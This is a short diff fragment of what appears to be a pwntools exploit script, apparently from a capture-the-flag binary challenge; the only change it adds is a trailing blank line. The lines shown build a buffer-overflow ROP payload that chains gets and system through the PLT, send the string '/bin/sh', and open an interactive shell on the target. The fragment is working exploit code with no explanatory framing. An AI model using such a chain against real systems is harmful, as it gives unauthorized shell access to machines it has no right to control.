@@ -15,3 +15,4 @@ payload = b'A' * offset+p32(gets_plt)+p32(pop_ebx)+p32(buf2)+p32(system_plt)+p32
 sh.sendline(payload)
 sh.sendline(b'/bin/sh')
 sh.interactive()
+
